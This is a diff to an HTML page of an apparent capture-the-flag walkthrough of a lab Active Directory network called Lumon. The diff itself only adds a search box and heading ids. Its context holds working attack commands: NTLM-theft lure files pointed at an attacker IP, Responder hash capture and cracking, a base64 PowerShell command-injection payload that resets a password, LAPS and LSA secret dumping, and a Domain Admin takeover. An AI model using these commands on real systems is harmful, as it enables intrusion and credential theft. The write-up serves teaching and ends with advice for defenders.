@@ -140,6 +140,16 @@
     <span class="cursor" id="term-cursor" aria-hidden="true"></span>
     <span class="sr-only">Zerotrace Logs</span>
   </h1>
+  <!-- Search Box -->
+  <div class="search-container">
+    <input type="search"
+           id="siteSearch"
+           class="search-input"
+           placeholder="Search walkthroughs..."
+           aria-label="Search walkthroughs"
+           autocomplete="off">
+    <div id="searchResults" class="search-results" hidden></div>
+  </div>
 </header>
 
 <!-- Side hamburger control -->
@@ -196,7 +206,7 @@
 <div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
 
 <section>
-  <h2>Lumon</h2>
+  <h2 id="lumon">Lumon</h2>
 
   <div class="machine-info">
     <ul>
@@ -207,7 +217,7 @@
     </ul>
   </div>
 
-  <h3>Overview</h3>
+  <h3 id="overview">Overview</h3>
   <p>Lumon Industries will soon be integrating a high-value employee into the organization. In accordance with internal security protocols, a comprehensive penetration test and internal access verification must be conducted prior to full onboarding.</p>
   <p>For the purposes of this evaluation, you will be provided the assigned credentials and access permissions corresponding to the subject employee. Your objective is to assess the scope and boundaries of these permissions, ensuring compliance with all Lumon security standards and operational safeguards.</p>
 
@@ -215,9 +225,9 @@
     <strong>Starting Credentials:</strong> hellyr:H3lenaR!2025
   </div>
 
-  <h2>Reconnaissance</h2>
+  <h2 id="reconnaissance">Reconnaissance</h2>
 
-  <h3><span class="step">[Step 1]</span> Domain Controller Enumeration</h3>
+  <h3 id="domain-controller-enumeration"><span class="step">[Step 1]</span> Domain Controller Enumeration</h3>
   <p>I started with a full port scan against the domain controller.</p>
   <pre><code>$ <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">nmap</a> -p- -T4 -sC -sV -Pn 10.1.249.22 -o nmap_scan</code></pre>
 
@@ -248,7 +258,7 @@ PORT      STATE SERVICE       VERSION
     <li>Standard AD services: Kerberos (88), LDAP (389/636), SMB (445), RDP (3389)</li>
   </ul>
 
-  <h3><span class="step">[Step 2]</span> Intranet Server Enumeration</h3>
+  <h3 id="intranet-server-enumeration"><span class="step">[Step 2]</span> Intranet Server Enumeration</h3>
   <p>A second target was identified - an intranet server.</p>
   <pre><code>$ nmap -p- -T4 -sC -sV -Pn 10.1.118.95 -o nmap_scan</code></pre>
 
@@ -274,7 +284,7 @@ PORT      STATE SERVICE       VERSION
     <li>SMB and RDP accessible</li>
   </ul>
 
-  <h3><span class="step">[Step 3]</span> Credential Validation and Host Setup</h3>
+  <h3 id="credential-validation-and-host-setup"><span class="step">[Step 3]</span> Credential Validation and Host Setup</h3>
   <p>I validated the provided credentials and generated hosts file entries for both targets.</p>
   <pre><code>$ <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener noreferrer">nxc</a> smb 10.1.249.22 -u hellyr -p 'H3lenaR!2025'
 SMB         10.1.249.22     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:lumons.hacksmarter) (signing:True) (SMBv1:None)
@@ -295,9 +305,9 @@ $ cat intranet_host
     <strong>Note:</strong> SMB signing is <strong>disabled</strong> on the INTRANET server (<code>signing:False</code>), which makes it vulnerable to NTLM relay attacks.
   </div>
 
-  <h2>Intranet Enumeration</h2>
+  <h2 id="intranet-enumeration">Intranet Enumeration</h2>
 
-  <h3><span class="step">[Step 4]</span> SMB Share Discovery</h3>
+  <h3 id="smb-share-discovery"><span class="step">[Step 4]</span> SMB Share Discovery</h3>
   <p>Enumerating SMB shares on the Intranet server revealed READ/WRITE access to a share called <code>MDRepo</code>.</p>
   <pre><code>$ netexec smb 10.1.150.108 -u 'HELLYR' -p 'H3lenaR!2025' --shares
 SMB         10.1.150.108    445    INTRANET         [*] Enumerated shares
@@ -321,7 +331,7 @@ smb: \> mget *
 getting file \Lumons Intranet.url of size 131 as Lumons Intranet.url (0.2 KiloBytes/sec)
 getting file \Lumons_International.pdf of size 539001 as Lumons_International.pdf (345.8 KiloBytes/sec)</code></pre>
 
-  <h3><span class="step">[Step 5]</span> PDF Analysis - Intranet Documentation</h3>
+  <h3 id="pdf-analysis-intranet-documentation"><span class="step">[Step 5]</span> PDF Analysis - Intranet Documentation</h3>
   <p>The <code>.url</code> file did not contain any credentials. However, the PDF contained valuable information about the internal web server.</p>
 
   <p><img src="../assets/lumon/image.png" alt="PDF showing intranet portal information" loading="lazy"></p>
@@ -330,7 +340,7 @@ getting file \Lumons_International.pdf of size 539001 as Lumons_International.pd
 
   <p><img src="../assets/lumon/image-1.png" alt="Admin panel access requirements" loading="lazy"></p>
 
-  <h3><span class="step">[Step 6]</span> Web Directory Enumeration</h3>
+  <h3 id="web-directory-enumeration"><span class="step">[Step 6]</span> Web Directory Enumeration</h3>
   <p>I ran directory enumeration against the intranet web server.</p>
   <pre><code>$ <a href="https://github.com/epi052/feroxbuster" target="_blank" rel="noopener noreferrer">feroxbuster</a> -u https://intranet.lumons.hacksmarter -k -w /usr/share/wordlists/dirb/big.txt</code></pre>
 
@@ -347,9 +357,9 @@ getting file \Lumons_International.pdf of size 539001 as Lumons_International.pd
 
   <p><img src="../assets/lumon/image-2.png" alt="Login portal with limited access" loading="lazy"></p>
 
-  <h2>BloodHound Enumeration</h2>
+  <h2 id="bloodhound-enumeration">BloodHound Enumeration</h2>
 
-  <h3><span class="step">[Step 7]</span> Active Directory Data Collection</h3>
+  <h3 id="active-directory-data-collection"><span class="step">[Step 7]</span> Active Directory Data Collection</h3>
   <p>To find a path for lateral movement, I collected LDAP data for <a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener noreferrer">BloodHound</a> analysis.</p>
   <pre><code>$ netexec ldap 10.1.132.246 -u 'HELLYR' -p 'H3lenaR!2025' --bloodhound --collection All --dns-server 10.1.132.246
 LDAP        10.1.132.246    389    DC01             [+] lumons.hacksmarter\HELLYR:H3lenaR!2025
@@ -367,7 +377,7 @@ LDAP        10.1.132.246    389    DC01             Compressing output into /hom
     BloodHound is an Active Directory reconnaissance tool that uses graph theory to reveal hidden attack paths. It collects data about AD relationships, permissions, and group memberships to identify privilege escalation opportunities.
   </div>
 
-  <h3><span class="step">[Step 8]</span> Attack Path Analysis</h3>
+  <h3 id="attack-path-analysis"><span class="step">[Step 8]</span> Attack Path Analysis</h3>
   <p>The user <code>hellyr</code> had no outbound object controls. However, checking group memberships revealed another user called <code>MARKS</code> in the same group.</p>
 
   <p><img src="../assets/lumon/image-3.png" alt="Group membership showing MARKS user" loading="lazy"></p>
@@ -378,7 +388,7 @@ LDAP        10.1.132.246    389    DC01             Compressing output into /hom
 
   <p><img src="../assets/lumon/image-5.png" alt="LAPS ADMINS group membership" loading="lazy"></p>
 
-  <h3><span class="step">[Step 9]</span> ForceChangePassword ACE Discovery</h3>
+  <h3 id="forcechangepassword-ace-discovery"><span class="step">[Step 9]</span> ForceChangePassword ACE Discovery</h3>
   <p>Checking the inbound object controls for user <code>MARKS</code> revealed that the <code>INTRANETSVC</code> service account has the <code>ForceChangePassword</code> ACE.</p>
 
   <p><img src="../assets/lumon/image-6.png" alt="ForceChangePassword ACE on MARKS" loading="lazy"></p>
@@ -393,7 +403,7 @@ LDAP        10.1.132.246    389    DC01             Compressing output into /hom
   <p>Based on this analysis, I mapped out the theoretical attack chain:</p>
   <pre><code>INTRANETSVC --> ForceChangePassword --> MARKS --> LAPS --> LOCAL ADMIN --> SAM/LSA DUMP --> DC COMPROMISE</code></pre>
 
-  <h2>Exploitation - NTLM Hash Capture</h2>
+  <h2 id="exploitation-ntlm-hash-capture">Exploitation - NTLM Hash Capture</h2>
 
   <p>Since I had READ/WRITE access to the <code>MDRepo</code> share, I decided to attempt a watering hole attack to capture NTLM hashes from users browsing the share.</p>
 
@@ -404,7 +414,7 @@ LDAP        10.1.132.246    389    DC01             Compressing output into /hom
     In this context, placing malicious files on a shared folder that automatically trigger NTLM authentication back to an attacker-controlled server when users browse the folder.
   </div>
 
-  <h3><span class="step">[Step 10]</span> Creating Malicious Files with ntlm_theft</h3>
+  <h3 id="creating-malicious-files-with-ntlm-theft"><span class="step">[Step 10]</span> Creating Malicious Files with ntlm_theft</h3>
   <p>I used <a href="https://github.com/Greenwolf/ntlm_theft" target="_blank" rel="noopener noreferrer">ntlm_theft</a> to generate multiple file types that trigger NTLM authentication.</p>
   <pre><code>$ python3 ntlm_theft.py -g modern -s 10.200.30.12 -f meeting</code></pre>
 
@@ -416,7 +426,7 @@ putting file meeting-(externalcell).xlsx as \meeting-(externalcell).xlsx (11.5 k
 putting file meeting.rtf as \meeting.rtf (0.2 kB/s)
 ...</code></pre>
 
-  <h3><span class="step">[Step 11]</span> Capturing NTLMv2 Hash</h3>
+  <h3 id="capturing-ntlmv2-hash"><span class="step">[Step 11]</span> Capturing NTLMv2 Hash</h3>
   <p>With <a href="https://github.com/lgandx/Responder" target="_blank" rel="noopener noreferrer">Responder</a> running, I immediately captured a hash for user <code>harmonyc</code>.</p>
 
   <p><img src="../assets/lumon/image-7.png" alt="Captured NTLMv2 hash for harmonyc" loading="lazy"></p>
@@ -425,7 +435,7 @@ putting file meeting.rtf as \meeting.rtf (0.2 kB/s)
 
   <p><img src="../assets/lumon/image-8.png" alt="PDF showing harmonyc as admin" loading="lazy"></p>
 
-  <h3><span class="step">[Step 12]</span> Cracking the Hash</h3>
+  <h3 id="cracking-the-hash"><span class="step">[Step 12]</span> Cracking the Hash</h3>
   <p>I cracked the NTLMv2 hash using <a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener noreferrer">Hashcat</a> with module 5600.</p>
   <pre><code>$ hashcat -m 5600 harmonyc.hash /usr/share/wordlists/rockyou.txt</code></pre>
 
@@ -435,17 +445,17 @@ putting file meeting.rtf as \meeting.rtf (0.2 kB/s)
     <strong>Credentials obtained:</strong> HARMONYC:[REDACTED]
   </div>
 
-  <h2>Web Application Access</h2>
+  <h2 id="web-application-access">Web Application Access</h2>
 
-  <h3><span class="step">[Step 13]</span> Admin Portal Login</h3>
+  <h3 id="admin-portal-login"><span class="step">[Step 13]</span> Admin Portal Login</h3>
   <p>With the admin credentials, I logged into the intranet portal successfully.</p>
 
   <p><img src="../assets/lumon/image-10.png" alt="Successful admin login" loading="lazy"></p>
 
-  <h3><span class="step">[Step 14]</span> Admin Panel Discovery</h3>
+  <h3 id="admin-panel-discovery"><span class="step">[Step 14]</span> Admin Panel Discovery</h3>
   <p>Enumerating the admin panel revealed two interesting functionalities:</p>
 
-  <h4>1. Command Injection via Ping Functionality</h4>
+  <h4 id="1-command-injection-via-ping-functionality">1. Command Injection via Ping Functionality</h4>
 
   <p><img src="../assets/lumon/image-11.png" alt="Ping functionality in admin panel" loading="lazy"></p>
 
@@ -458,15 +468,15 @@ putting file meeting.rtf as \meeting.rtf (0.2 kB/s)
     A vulnerability where user input is passed directly to system commands without proper sanitization, allowing attackers to execute arbitrary commands by injecting shell metacharacters like <code>;</code>, <code>|</code>, or <code>&&</code>.
   </div>
 
-  <h4>2. UNC Path Browser Functionality</h4>
+  <h4 id="2-unc-path-browser-functionality">2. UNC Path Browser Functionality</h4>
 
   <p><img src="../assets/lumon/image-13.png" alt="File share browser functionality" loading="lazy"></p>
 
   <p>This functionality allows browsing UNC paths, which can be abused to capture NTLM hashes.</p>
 
-  <h2>Compromising INTRANETSVC</h2>
+  <h2 id="compromising-intranetsvc">Compromising INTRANETSVC</h2>
 
-  <h3><span class="step">[Step 15]</span> Method 1: UNC Path Hash Capture</h3>
+  <h3 id="method-1-unc-path-hash-capture"><span class="step">[Step 15]</span> Method 1: UNC Path Hash Capture</h3>
   <p>I used the file share browsing functionality to point to my attacker machine while running Responder.</p>
 
   <p><img src="../assets/lumon/image-14.png" alt="UNC path pointing to attacker" loading="lazy"></p>
@@ -481,16 +491,16 @@ putting file meeting.rtf as \meeting.rtf (0.2 kB/s)
     <strong>Credentials obtained:</strong> INTRANETSVC:[REDACTED]
   </div>
 
-  <h3><span class="step">[Step 16]</span> Method 2: Command Injection (Alternative)</h3>
+  <h3 id="method-2-command-injection-alternative"><span class="step">[Step 16]</span> Method 2: Command Injection (Alternative)</h3>
   <p>Alternatively, I could have used the ping command injection to force change the password directly. First, I encoded the PowerShell command to base64 to handle special characters.</p>
   <pre><code>$ echo -n "\$SecPassword = ConvertTo-SecureString 'NewP@ssw0rd123!' -AsPlainText -Force; Set-ADAccountPassword -Identity MarkS -Reset -NewPassword \$SecPassword" | iconv -t UTF-16LE | base64 -w 0</code></pre>
 
   <p>Then injected it via the ping functionality:</p>
   <pre><code>127.0.0.1;powershell -enc JABTAGUAYwBQAGEAcwBzAHcAbwByAGQAIAA9ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgACcATgBlAHcAUABAAHMAcwB3ADAAcgBkADEAMgAzACEAJwAgAC0AQQBzAFAAbABhAGkAbgBUAGUAeAB0ACAALQBGAG8AcgBjAGUAOwAgAFMAZQB0AC0AQQBEAEEAYwBjAG8AdQBuAHQAUABhAHMAcwB3AG8AcgBkACAALQBJAGQAZQBuAHQAaQB0AHkAIABNAGEAcgBrAFMAIAAtAFIAZQBzAGUAdAAgAC0ATgBlAHcAUABhAHMAcwB3AG8AcgBkACAAJABTAGUAYwBQAGEAcwBzAHcAbwByAGQA</code></pre>
 
-  <h2>Lateral Movement to MARKS</h2>
+  <h2 id="lateral-movement-to-marks">Lateral Movement to MARKS</h2>
 
-  <h3><span class="step">[Step 17]</span> Force Changing MARKS Password</h3>
+  <h3 id="force-changing-marks-password"><span class="step">[Step 17]</span> Force Changing MARKS Password</h3>
   <p>Using <a href="https://github.com/CravateRouge/bloodyAD" target="_blank" rel="noopener noreferrer">bloodyAD</a>, I leveraged the ForceChangePassword ACE to reset the MARKS password.</p>
   <pre><code>$ bloodyAD -u 'IntranetSvc' -p '[REDACTED]' --host DC01.lumons.hacksmarter set password 'MARKS' 'NewP@ssw0rd123!'</code></pre>
 
@@ -500,9 +510,9 @@ putting file meeting.rtf as \meeting.rtf (0.2 kB/s)
 
   <p><img src="../assets/lumon/image-12.png" alt="Validated MARKS access" loading="lazy"></p>
 
-  <h2>LAPS Password Extraction</h2>
+  <h2 id="laps-password-extraction">LAPS Password Extraction</h2>
 
-  <h3><span class="step">[Step 18]</span> Extracting LAPS Credentials</h3>
+  <h3 id="extracting-laps-credentials"><span class="step">[Step 18]</span> Extracting LAPS Credentials</h3>
   <p>With MARKS compromised, I could now extract LAPS passwords using NetExec.</p>
   <pre><code>$ nxc ldap 10.1.132.246 -u MarkS -p 'NewP@ssw0rd123!' -M laps</code></pre>
 
@@ -519,27 +529,27 @@ putting file meeting.rtf as \meeting.rtf (0.2 kB/s)
     <strong>Credentials obtained:</strong> localadmin:[REDACTED] (on INTRANET)
   </div>
 
-  <h2>Privilege Escalation on INTRANET</h2>
+  <h2 id="privilege-escalation-on-intranet">Privilege Escalation on INTRANET</h2>
 
-  <h3><span class="step">[Step 19]</span> UAC Bypass via RDP</h3>
+  <h3 id="uac-bypass-via-rdp"><span class="step">[Step 19]</span> UAC Bypass via RDP</h3>
   <p>Due to UAC filtering, I couldn't use the local admin credentials for remote elevated access via WinRM/SMB. However, RDP access was available.</p>
 
   <p><img src="../assets/lumon/image-19.png" alt="UAC filtering blocking remote admin" loading="lazy"></p>
 
   <pre><code>$ <a href="https://www.freerdp.com/" target="_blank" rel="noopener noreferrer">xfreerdp3</a> /v:INTRANET /u:localadmin /p:'[REDACTED]' +dynamic-resolution</code></pre>
 
-  <h3><span class="step">[Step 20]</span> User Flag</h3>
+  <h3 id="user-flag"><span class="step">[Step 20]</span> User Flag</h3>
   <p>The user flag is located at <code>C:\Users\MarkS\Desktop</code>.</p>
 
-  <h3><span class="step">[Step 21]</span> Adding MARKS to Local Administrators</h3>
+  <h3 id="adding-marks-to-local-administrators"><span class="step">[Step 21]</span> Adding MARKS to Local Administrators</h3>
   <p>I opened a CMD shell as administrator (accepting the UAC prompt) and added MARKS to the local Administrators group.</p>
   <pre><code>> net localgroup Administrators MarkS /add</code></pre>
 
   <p><img src="../assets/lumon/image-20.png" alt="MARKS added to Administrators" loading="lazy"></p>
 
-  <h2>LSA Dump and Domain Admin Compromise</h2>
+  <h2 id="lsa-dump-and-domain-admin-compromise">LSA Dump and Domain Admin Compromise</h2>
 
-  <h3><span class="step">[Step 22]</span> Dumping LSA Secrets</h3>
+  <h3 id="dumping-lsa-secrets"><span class="step">[Step 22]</span> Dumping LSA Secrets</h3>
   <p>With local admin access, I dumped LSA secrets and found multiple DCC2 hashes, including one for Domain Admin <code>hellye</code>.</p>
 
   <p><img src="../assets/lumon/image-21.png" alt="LSA dump results" loading="lazy"></p>
@@ -553,7 +563,7 @@ putting file meeting.rtf as \meeting.rtf (0.2 kB/s)
     Domain Cached Credentials version 2 (DCC2) are cached password hashes stored on domain-joined computers. They allow authentication when the domain controller is unreachable but can be cracked offline.
   </div>
 
-  <h3><span class="step">[Step 23]</span> Cracking Domain Admin Hash</h3>
+  <h3 id="cracking-domain-admin-hash"><span class="step">[Step 23]</span> Cracking Domain Admin Hash</h3>
   <p>Using Hashcat with module 2100 (DCC2), I cracked the Domain Admin password.</p>
   <pre><code>$ hashcat -m 2100 hellye.hash /usr/share/wordlists/rockyou.txt</code></pre>
 
@@ -563,19 +573,19 @@ putting file meeting.rtf as \meeting.rtf (0.2 kB/s)
     <strong>Credentials obtained:</strong> hellye:[REDACTED] (Domain Admin)
   </div>
 
-  <h3><span class="step">[Step 24]</span> Validating Domain Admin Access</h3>
+  <h3 id="validating-domain-admin-access"><span class="step">[Step 24]</span> Validating Domain Admin Access</h3>
 
   <p><img src="../assets/lumon/image-24.png" alt="Domain Admin access confirmed" loading="lazy"></p>
 
-  <h2>Root Flag</h2>
+  <h2 id="root-flag">Root Flag</h2>
 
-  <h3><span class="step">[Step 25]</span> Domain Controller Access</h3>
+  <h3 id="domain-controller-access"><span class="step">[Step 25]</span> Domain Controller Access</h3>
   <p>I connected to the Domain Controller via RDP as the Domain Admin.</p>
   <pre><code>$ xfreerdp3 /v:10.1.132.246 /u:hellye /p:'[REDACTED]' +dynamic-resolution</code></pre>
 
   <p>The root flag is located at <code>C:\Users\Administrator\Desktop</code>.</p>
 
-  <h2>Attack Chain Summary</h2>
+  <h2 id="attack-chain-summary">Attack Chain Summary</h2>
   <div class="attack-chain">
     <pre><code>hellyr (starting access)
     |
@@ -603,7 +613,7 @@ RDP Access + LSA Dump --> DCC2 hash for hellye (Domain Admin)
     v
 Domain Admin Compromised --> DC01 Root Access</code></pre>
 
-    <h4>Detailed Steps:</h4>
+    <h4 id="detailed-steps">Detailed Steps:</h4>
     <ol>
       <li><strong>Initial Access</strong> - Started with provided credentials for <code>hellyr</code></li>
       <li><strong>SMB Enumeration</strong> - Discovered MDRepo share with READ/WRITE access</li>
@@ -617,9 +627,9 @@ Domain Admin Compromised --> DC01 Root Access</code></pre>
     </ol>
   </div>
 
-  <h2>Lessons Learned</h2>
+  <h2 id="lessons-learned">Lessons Learned</h2>
 
-  <h3><span class="step defender">For Defenders</span></h3>
+  <h3 id="for-defenders"><span class="step defender">For Defenders</span></h3>
   <div class="answer lessons-learned">
     <ul>
       <li>Enable SMB signing on all servers to prevent NTLM relay attacks</li>
@@ -632,7 +642,7 @@ Domain Admin Compromised --> DC01 Root Access</code></pre>
     </ul>
   </div>
 
-  <h3><span class="step pentester">For Pentesters</span></h3>
+  <h3 id="for-pentesters"><span class="step pentester">For Pentesters</span></h3>
   <div class="answer lessons-learned">
     <ul>
       <li>Check SMB signing - disabled signing opens NTLM relay opportunities</li>
